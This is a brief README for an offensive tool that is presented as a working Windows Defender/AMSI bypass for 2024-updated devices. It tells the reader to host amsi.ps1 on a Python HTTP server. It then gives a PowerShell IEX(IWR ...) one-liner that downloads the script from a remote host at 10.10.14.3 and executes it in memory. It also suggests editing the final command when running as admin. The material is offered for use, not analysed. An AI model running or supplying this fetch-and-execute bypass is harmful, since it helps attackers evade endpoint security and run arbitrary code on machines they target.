### Working bypass for 2024
In this folder there is the **amsi.ps1** that should work for defender/AMSI bypass for devices up to 2024 updated.

1)host the file on a python HTTP server
2)Call it back via
```
powershell IEX(IWR http://10.10.14.3:8081/amsi.ps1 -UseBasicParsing)
```
3)You might edit the commando to be executed at the end of the script if you are admin. If you see errors upon execution don't worry it should work anyway!
